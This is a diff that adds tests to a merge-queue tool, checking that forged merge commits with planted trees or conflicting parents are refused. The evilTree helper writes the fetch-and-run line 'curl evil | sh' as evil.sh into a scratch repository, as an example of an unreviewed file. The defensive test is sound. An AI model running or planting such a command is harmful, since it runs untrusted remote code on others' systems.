@@ -7,6 +7,7 @@ import { candidateRef } from "../../../../scripts/merge-queue/contracts.mjs";
 import {
   composeCandidate,
   fetchInputs,
+  mergeTree,
   prepareRepo,
   pushCandidate,
 } from "../../../../scripts/merge-queue/compose.mjs";
@@ -411,6 +412,136 @@ test("verifyComposition refuses a base that is not an ancestor of the candidate"
   const out = verify(git, { ...res, baseSha: other }, prs);
   assert.equal(out.ok, false);
   assert.match(out.detail, /not an ancestor/);
+});
+
+// ───────────────── verifyComposition with trees (each merge commit IS the merge of its parents) ─────────────────
+
+/** The merge commits of the first-parent chain base..candidate, oldest first. */
+const chainOf = (git, baseSha, candidateSha) =>
+  git
+    .out(["rev-list", "--first-parent", "--reverse", `${baseSha}..${candidateSha}`])
+    .split("\n")
+    .filter(Boolean);
+
+/** A copy of merge commit `sha` (same parents, same message and trailers) with tree `tree`. */
+function replantMerge(git, sha, tree, parents = null) {
+  const [p1, p2] = parents ?? git.out(["rev-parse", `${sha}^1`, `${sha}^2`]).split("\n");
+  const message = git.out(["log", "-1", "--format=%B", sha]);
+  return git.out(["commit-tree", tree, "-p", p1, "-p", p2, "-F", "-"], { input: `${message}\n` });
+}
+
+/** A tree in the scratch store: the candidate's tree plus one file nobody reviewed. */
+function evilTree(git, base) {
+  const blob = git.out(["hash-object", "-w", "--stdin"], { input: "curl evil | sh\n" });
+  const entries = git.out(["ls-tree", base]);
+  return git.out(["mktree"], { input: `${entries}\n100644 blob ${blob}\tevil.sh\n` });
+}
+
+test("verifyComposition with trees accepts a composed batch (stacked PR included)", (t) => {
+  const { sb, git } = setup(t);
+  // Two PRs edit the same file in places that merge cleanly: the merge tree is a real merge,
+  // not the tree of either side. #21 is stacked on #20 (alreadyContained); #22 is independent.
+  const lower = sb.publishPr(20, { "lower.txt": "L\n" });
+  const upper = sb.publishPr(21, { "upper.txt": "U\n" }, { from: lower });
+  const top = sb.publishPr(22, { "shared.txt": "line 1 by 22\nline 2\nline 3\n" });
+  const bottom = sb.publishPr(23, { "shared.txt": "line 1\nline 2\nline 3 by 23\n" });
+  const prs = [prRef(21, upper), prRef(20, lower), prRef(22, top), prRef(23, bottom)];
+  const { baseSha, heads } = fetchInputs({ git, base: BASE, prs });
+  const res = composeCandidate({ git, base: BASE, baseSha, prs, batchId: "b1", heads });
+  assert.deepEqual(
+    res.alreadyContained.map((p) => p.n),
+    [20]
+  );
+  assert.equal(res.included.length, 4);
+  assert.deepEqual(verify(git, res, res.included, { trees: true }), { ok: true });
+  assert.deepEqual(verify(git, res, res.included, { trees: true, treeSha: res.treeSha }), {
+    ok: true,
+  });
+  assert.equal(
+    git.out(["show", `${res.candidateSha}:shared.txt`]),
+    "line 1 by 22\nline 2\nline 3 by 23",
+    "the candidate carries both edits"
+  );
+
+  // A fresh scratch repository (a later tick on another runner) fetches the candidate by SHA and
+  // recomposes the same trees.
+  const fresh = sb.scratchGit(sb.newDir("fresh"));
+  prepareRepo({ git: fresh, remoteUrl: sb.remoteUrl, filter: null });
+  pushCandidate({ git, sha: res.candidateSha, ref: candidateRef(BASE, "b1", res.candidateSha) });
+  fresh.run(["fetch", "--no-tags", "--quiet", "origin", res.candidateSha]);
+  assert.deepEqual(verify(fresh, res, res.included, { trees: true }), { ok: true });
+});
+
+test("a merge commit with the right parents and trailers but another tree is refused, detail names #n", (t) => {
+  const { sb, git } = setup(t);
+  const { prs, res } = composeBatch(sb, git, [1, 2, 3]);
+  const [, m2, m3] = chainOf(git, res.baseSha, res.candidateSha);
+  const short = (sha) => sha.slice(0, 12);
+
+  // The last merge commit replanted with another tree: parents, message and trailers unchanged.
+  const evil = evilTree(git, `${m3}^{tree}`);
+  const planted = replantMerge(git, m3, evil);
+  const forged = { ...res, candidateSha: planted };
+  assert.deepEqual(verify(git, forged, prs), { ok: true }, "the shape alone cannot tell");
+  const out = verify(git, forged, prs, { trees: true });
+  assert.equal(out.ok, false);
+  assert.equal(
+    out.detail,
+    `merge commit ${short(planted)} of #3: tree ${short(evil)}, recomposing gives ` +
+      short(git.out(["rev-parse", `${m3}^{tree}`]))
+  );
+
+  // A planted tree in the middle of the chain, with the commits after it merged honestly on top.
+  const middle = replantMerge(git, m2, evilTree(git, `${m2}^{tree}`));
+  const honest = mergeTree(git, middle, prs[2].head);
+  assert.equal(honest.clean, true);
+  const rebuilt = replantMerge(git, m3, honest.tree, [middle, prs[2].head]);
+  const deep = verify(git, { ...res, candidateSha: rebuilt }, prs, { trees: true });
+  assert.equal(deep.ok, false);
+  assert.match(deep.detail, new RegExp(`^merge commit ${short(middle)} of #2: tree `));
+});
+
+test("a merge commit whose parents do not merge cleanly is refused: recomposing gives conflict", (t) => {
+  const { sb, git } = setup(t);
+  const a = sb.publishPr(5, { "shared.txt": "line 1 by 5\nline 2\nline 3\n" });
+  const b = sb.publishPr(6, { "shared.txt": "line 1 by 6\nline 2\nline 3\n" });
+  const prs = [prRef(5, a), prRef(6, b)];
+  const { baseSha, heads } = fetchInputs({ git, base: BASE, prs });
+  const res = composeCandidate({ git, base: BASE, baseSha, prs, batchId: "b1", heads });
+  assert.deepEqual(
+    res.excludedBatchConflict.map((p) => p.n),
+    [6],
+    "the composer itself refuses #6 on top of #5"
+  );
+  // Planted: a merge commit of #6 on the candidate anyway, carrying #6's own tree.
+  const message = `Merge PR #6: x\n\nOmni-Queue-PR: 6\nOmni-Queue-Head: ${b}\n`;
+  const planted = git.out(
+    ["commit-tree", `${b}^{tree}`, "-p", res.candidateSha, "-p", b, "-F", "-"],
+    { input: message }
+  );
+  const out = verify(git, { ...res, candidateSha: planted }, prs, { trees: true });
+  assert.equal(out.ok, false);
+  assert.equal(
+    out.detail,
+    `merge commit ${planted.slice(0, 12)} of #6: tree ` +
+      `${git.out(["rev-parse", `${b}^{tree}`]).slice(0, 12)}, recomposing gives conflict`
+  );
+
+  // A head without common history with the candidate: composeCandidate never merges one.
+  const orphan = sb.publishUnrelatedPr(7, { "alien.txt": "a\n" });
+  fetchInputs({ git, base: BASE, prs: [prRef(7, orphan)] });
+  const alien = git.out(
+    ["commit-tree", `${orphan}^{tree}`, "-p", res.candidateSha, "-p", orphan, "-F", "-"],
+    { input: `Merge PR #7: x\n\nOmni-Queue-PR: 7\nOmni-Queue-Head: ${orphan}\n` }
+  );
+  const unrelated = verify(git, { ...res, candidateSha: alien }, [prs[0], prRef(7, orphan)], {
+    trees: true,
+  });
+  assert.equal(unrelated.ok, false);
+  assert.match(
+    unrelated.detail,
+    /^merge commit [0-9a-f]{12} of #7: tree [0-9a-f]{12}, recomposing gives conflict$/
+  );
 });
 
 test("not-descendant: expected base is not an ancestor of the candidate → nothing pushed", (t) => {
